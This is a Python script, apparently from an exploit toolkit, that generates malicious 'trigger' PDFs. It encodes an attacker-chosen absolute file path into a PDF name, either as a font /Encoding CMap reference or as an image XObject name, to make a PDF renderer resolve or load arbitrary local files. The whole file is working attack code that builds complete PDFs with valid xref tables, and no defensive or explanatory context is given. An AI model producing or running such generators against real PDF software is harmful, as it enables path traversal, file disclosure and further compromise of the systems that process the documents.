import io, struct

def build_trigger(args):
    if args.encoding_path == None:
        print("Please provide '--encoding-path' parameter")
        exit()
        
    trigger_type = getattr(args, 'pdf_trigger_type', 'cmap')
    
    if trigger_type == 'cmap':
        content = build_trigger_pdf_cmap(args.encoding_path)
        output_file = args.output + "l1.pdf"
    elif trigger_type == 'traversal':
        content = build_trigger_pdf_traversal(args.encoding_path)
        output_file = args.output + "l1.pdf"
    else:
        print(f"Unknown trigger type: {trigger_type}")
        exit()
    
    with open(output_file, "wb") as file:
        file.write(content)

def encode_pdf_name_abs(abs_path: str) -> str:
    return "/" + abs_path.replace("/", "#2F")

def obj(n, body: bytes):
    return f"{n} 0 obj\n".encode() + body + b"\nendobj\n"

def build_trigger_pdf_cmap(path: str) -> bytes:
    enc_name = encode_pdf_name_abs(path)
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    objs = []

    objs.append(obj(1, b"<< /Type /Catalog /Pages 2 0 R >>"))
    objs.append(obj(2, b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>"))
    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>"
    objs.append(obj(3, page))
    stream = b"BT /F1 12 Tf (A) Tj ET"
    objs.append(obj(4, b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream"))
    font_dict = f"<< /Type /Font /Subtype /Type0 /BaseFont /Identity-H /Encoding {enc_name} /DescendantFonts [6 0 R] >>".encode()
    objs.append(obj(5, font_dict))
    objs.append(obj(6, b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Dummy /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> >>"))

    buf = io.BytesIO()
    buf.write(header)
    offsets = []
    cursor = len(header)
    for o in objs:
        offsets.append(cursor)
        buf.write(o)
        cursor += len(o)

    xref_start = buf.tell()
    buf.write(b"xref\n0 7\n")
    buf.write(b"0000000000 65535 f \n")
    for off in offsets:
        buf.write(f"{off:010d} 00000 n \n".encode())
    buf.write(b"trailer\n<< /Size 7 /Root 1 0 R >>\n")
    buf.write(f"startxref\n{xref_start}\n%%EOF\n".encode())
    return buf.getvalue()

def build_trigger_pdf_traversal(path: str) -> bytes:
    path = encode_pdf_name_abs(path)
    IMG_DATA = b"HELLO"
    buf = io.BytesIO()
    header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
    buf.write(header)

    objs = []

    objs.append(obj(1, b"<< /Type /Catalog /Pages 2 0 R >>"))
    objs.append(obj(2, b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>"))

    xobj_dict = f"<< /XObject << {path} 5 0 R >> >>".encode()
    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources " + xobj_dict + b" /Contents 4 0 R >>"
    objs.append(obj(3, page))

    content = b"q 100 0 0 100 50 50 cm\n" + (path.encode() + b" Do\n") + b"Q\n"
    objs.append(obj(4, b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream"))

    img_dict = b"<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /DCTDecode /Length %d >>" % len(IMG_DATA)
    objs.append(obj(5, img_dict + b"\nstream\n" + IMG_DATA + b"\nendstream"))

    offsets = [buf.tell()]
    for o in objs:
        buf.write(o)
        offsets.append(buf.tell())
    offsets = offsets[:-1]

    xref_pos = buf.tell()
    buf.write(b"xref\n0 %d\n" % (len(objs) + 1))
    buf.write(b"0000000000 65535 f \n")
    for off in offsets:
        buf.write(f"{off:010d} 00000 n \n".encode())

    trailer = b"trailer\n<< /Size %d /Root 1 0 R >>\n" % (len(objs) + 1)
    buf.write(trailer)
    buf.write(b"startxref\n" + str(xref_pos).encode() + b"\n%%EOF\n")
    return buf.getvalue()